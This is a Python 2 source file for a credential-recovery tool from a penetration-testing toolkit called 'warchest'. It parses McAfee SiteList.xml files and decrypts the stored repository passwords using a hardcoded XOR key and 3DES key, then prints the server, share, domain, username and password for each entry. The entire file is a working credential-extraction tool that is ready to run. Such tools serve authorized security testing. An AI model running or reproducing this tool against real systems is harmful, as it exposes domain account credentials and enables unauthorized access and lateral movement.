##
# McAfee SiteList.xml Decryptor
##
import os
import sys
import base64
import argparse
from xml.dom import minidom

try:
    from Crypto.Cipher import DES3
except:
    print "Crypto module required. Please install it via pip."
    sys.exit(1)

def banner():
    logo =  '''
    ___________           .__              ____  ___
    \_   _____/_ __  _____|__| ____   ____ \   \/  /
     |    __)|  |  \/  ___/  |/  _ \ /    \ \     / 
     |     \ |  |  /\___ \|  (  <_> )   |  \/     \ 
     \___  / |____//____  >__|\____/|___|  /___/\  \\
         \/             \/               \/      \_/ 
    -------------------[warchest]-------------------
    McAfee SiteList.XML Decryptor Version 1.0
    <david.rude@fusionx.com>
    http://github.com/fxwarchest
    '''
    print logo

def print_results(credentials):
    print "\n"
    for cred in credentials:
        if 'site' in cred:
            print "%s" % cred['site']
            print "============================================="
            if 'server' in cred:
                print "Server           %s" % cred['server']
            if 'serverip' in cred:
                print "ServerIP         %s" % cred['serverip']
            if 'rpath' in cred:
                print "RelativePath     %s" % cred['rpath']
            if 'share' in cred:
                print "Share            %s" % cred['share']
            if 'domain' in cred:
                print "Domain           %s" % cred['domain']
            if 'username' in cred:
                print "Username         %s" % cred['username']
            if 'password' in cred:
                print "Password         %s" % cred['password']
                print "=============================================\n\n"

def parse_sitelist(file):
    xmldoc = minidom.parse(file)
    root = xmldoc.firstChild

    sitelist = root.getElementsByTagName('SiteList')[0]
    if sitelist.hasChildNodes == False:
        print "SiteList is empty"
        sys.exit(1)

    credentials = []
    for node in sitelist.childNodes:
        cred = {}
        cred['site'] = node.nodeName
        if node.hasAttribute('Server'):
            cred['server'] = node.getAttribute('Server')
        if node.hasAttribute('ServerIP'):
            cred['serverip'] = node.getAttribute('ServerIP')

        for child in node.childNodes:
            if child.nodeName == "ShareName":
                if child.hasChildNodes():
                    Share = child.childNodes[0].data
                else:
                    Share = "(empty)"
                cred['share'] = Share

            if child.nodeName == "DomainName":
                if child.hasChildNodes():
                    Domain = child.childNodes[0].data
                else:
                    Domain = "(empty)"
                cred['domain'] = Domain

            if child.nodeName == "RelativePath":
                if child.hasChildNodes():
                    RPath = child.childNodes[0].data
                else:
                    RPath = "(empty)"
                cred['rpath'] = RPath

            if child.nodeName == "UserName":
                if child.hasChildNodes():
                    Username = child.childNodes[0].data
                else:
                    Username = "(empty)"
                cred['username'] = Username

            if child.nodeName == "Password":
                if child.hasChildNodes():
                    Password = decrypt(child.childNodes[0].data)
                else:
                    Password = "(empty)"

                if len(Password) == 0:
                    Password = "(empty)"
                cred['password'] = Password

        credentials.append(cred)
    return credentials

def decrypt(encoded):
    key = "3ef136b8b33befbc3426a7b54ec41a377cd3199b00000000".decode('hex')
    xor_key = [0x12, 0x15, 0x0f, 0x10, 0x11, 0x1c, 0x1a, 0x06, 0x0a, 0x1f, 0x1b, 0x18, 0x17, 0x16, 0x05, 0x19]
    decoded = base64.b64decode(encoded)

    xored = ""
    for i in range(0, len(decoded)):
        xored += chr(ord(decoded[i]) ^ xor_key[i % len(xor_key)])

    cipher = DES3.new(key, DES3.MODE_ECB)
    decryptedString = cipher.decrypt(xored)

    password = ""
    for i in range(0, len(decryptedString)):
        if decryptedString[i] == '\x00':
            password = decryptedString[0:i]
            break

    return password

def main():
    banner()
    parser = argparse.ArgumentParser(usage = '%(prog)s [options]')
    parser.add_argument("-f", dest = "file", metavar = "file", type = str, help = "sitelist.xml file to decrypt")
    parser.add_argument("-p", dest = "password", metavar = "password", type = str, help = "base64 encoded password")

    if len(sys.argv) <= 1:
        parser.print_help()

    args = parser.parse_args()

    if(args.file):
        if(os.path.isfile(args.file)):
            credentials = parse_sitelist(args.file)
            print_results(credentials)
        else:
            print "Error the specified file does not exist."
            sys.exit(1)

    if(args.password):
        password = decrypt(args.password)
        print "Decrypted Password: %s\n" % password

if __name__ == "__main__":
    main()